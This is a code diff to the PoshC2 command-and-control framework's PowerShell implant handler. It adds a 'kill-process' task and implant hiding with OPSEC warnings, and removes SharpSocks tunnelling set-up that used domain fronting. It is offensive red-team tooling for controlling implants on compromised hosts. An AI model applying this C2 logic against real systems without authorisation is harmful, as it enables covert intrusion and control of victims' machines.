@@ -16,7 +16,7 @@ from poshc2.client.Opsec import ps_opsec
 from poshc2.server.payloads.Payloads import Payloads
 from poshc2.server.PowerStatus import getpowerstatus
 from poshc2.client.cli.CommandPromptCompleter import FilePathCompleter
-from poshc2.server.database.DB import new_task, select_item, update_label, kill_implant, get_implantdetails, get_c2server_all
+from poshc2.server.database.DB import hide_implant, new_task, select_item, update_label, kill_implant, get_implantdetails, get_c2server_all
 from poshc2.server.database.DB import get_newimplanturl, get_allurls, get_sharpurls, new_urldetails, get_powerstatusbyrandomuri
 
 
@@ -106,6 +106,9 @@ def handle_ps_command(command, user, randomuri, implant_id):
         return
     elif command.startswith("upload-file"):
         do_upload_file(user, command, randomuri)
+        return
+    elif command == "kill-process":
+        do_kill_process(user, command, randomuri)
         return
     elif command == "kill-implant" or command == "exit":
         do_kill_implant(user, command, randomuri)
@@ -482,17 +485,27 @@ def do_upload_file(user, command, randomuri):
         traceback.print_exc()
 
 
-def do_kill_implant(user, command, randomuri):
+def do_kill_process(user, command, randomuri):
     impid = get_implantdetails(randomuri)
+    print_bad("**OPSEC Warning** - kill-process will terminate the entire process, if you want to kill the thread only use kill-implant")
     ri = input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid.ImplantID)
     if ri.lower() == "n":
         print("Implant not terminated")
-    if ri == "":
-        new_task("exit", user, randomuri)
+    if ri == "" or ri.lower() == "y":
+        pid = impid.PID
+        new_task("get-process -id %s | kill" % (pid), user, randomuri)
         kill_implant(randomuri)
-    if ri.lower() == "y":
+
+
+def do_kill_implant(user, command, randomuri):
+    impid = get_implantdetails(randomuri)
+    print_bad("**OPSEC Warning** - kill-implant terminates the current threat not the entire process, if you want to kill the process use kill-process")
+    ri = input("Are you sure you want to remove the implant ID %s? (Y/n) " % impid.ImplantID)
+    if ri.lower() == "n":
+        print("Implant not removed")
+    if ri == "" or ri.lower() == "y":
         new_task("exit", user, randomuri)
-        kill_implant(randomuri)
+        hide_implant(randomuri)
 
 
 def do_exit(user, command, randomuri):
@@ -609,33 +622,7 @@ def do_stopsocks(user, command, randomuri):
 
 
 def do_sharpsocks(user, command, randomuri):
-    check_module_loaded("SharpSocks.ps1", randomuri, user)
-    import string
-    from random import choice
-    allchar = string.ascii_letters
-    channel = "".join(choice(allchar) for x in range(25))
-    sharpkey = gen_key().decode("utf-8")
-    sharpurls = get_sharpurls()
-    sharpurl = get_first_url(select_item("PayloadCommsHost", "C2Server"), select_item("DomainFrontHeader", "C2Server"))
-    dfheader = get_first_dfheader(select_item("DomainFrontHeader", "C2Server"))
-    implant = get_implantdetails(randomuri)
-    pivot = implant.Pivot
-    if pivot != "PS":
-        sharpurl = input("Enter the URL for SharpSocks: ")
-
-    print("\nIf using Docker, change the SocksHost to be the IP of the PoshC2 Server not 127.0.0.1:49031")
-    print("sharpsocks -t latest -s \"-c=%s -k=%s --verbose -l=http://*:%s\"\r" % (channel, sharpkey, SocksHost.split(":")[2]) + Colours.GREEN)
-    print("\nElse\n")
-    print("sharpsocks -c=%s -k=%s --verbose -l=%s\r\n" % (channel, sharpkey, SocksHost) + Colours.GREEN) 
-    ri = input("Are you ready to start the SharpSocks in the implant? (Y/n) ")
-    if ri.lower() == "n":
-        print("")
-    if (ri == "") or (ri.lower() == "y"):
-        taskcmd = "Sharpsocks -Client -Uri %s -Channel %s -Key %s -URLs %s -Insecure -Beacon 1000" % (sharpurl, channel, sharpkey, sharpurls)
-        if dfheader:
-            taskcmd += " -DomainFrontURL %s" % dfheader
-        new_task(taskcmd, user, randomuri)
-        update_label("SharpSocks", randomuri)
+    print(f"{Colours.RED}SharpSocks is not presently supported in the PowerShell implant{Colours.GREEN}")
 
 
 def do_reversedns(user, command, randomuri):
